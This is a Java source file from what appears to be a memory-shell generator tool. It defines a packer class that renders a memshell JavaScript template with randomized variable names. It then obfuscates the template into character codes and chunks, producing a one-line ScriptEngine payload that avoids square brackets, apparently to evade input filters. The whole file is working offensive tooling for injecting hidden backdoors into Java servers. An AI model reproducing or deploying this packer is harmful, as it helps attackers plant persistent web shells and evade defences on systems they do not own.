package org.leo.jmg.mem.packer.scriptengine;

import org.leo.jmg.mem.packer.ClassPackerConfig;
import org.leo.jmg.mem.packer.Packer;
import org.leo.jmg.mem.packer.PackerCapability;
import org.leo.jmg.mem.packer.PackerMeta;
import org.leo.jmg.mem.packer.TemplateRenderer;
import org.leo.jmg.mem.packer.PackerResources;
import org.leo.jmg.mem.packer.obfuscation.LiteralObfuscator;
import org.leo.jmg.mem.packer.obfuscation.PayloadObfuscator;

import static org.leo.jmg.mem.packer.scriptengine.DefaultScriptEnginePacker.scriptToSingleLine;

@PackerMeta(
        name = "ScriptEngineNoSquareBrackets",
        group = "ScriptEngine",
        order = 2,
        requiredCapabilities = PackerCapability.JAVASCRIPT_ENGINE,
        requiredClasses = "javax.script.ScriptEngineManager"
)
public class ScriptEngineNoSquareBracketsPacker implements Packer {
    private final String jsTemplate = PackerResources.loadTemplate("/memshell-template/ScriptEngineNoSquareBrackets.js.txt");

    @Override
    public String pack(ClassPackerConfig config) {
        // TemplateRenderer 在渲染阶段完成变量名随机化（{{VAR:x}} 占位符）
        String script = TemplateRenderer.render(jsTemplate, config);
        return scriptToSingleLine(PayloadObfuscator.chunk(
                LiteralObfuscator.javascriptCharCodes(script)));
    }
}
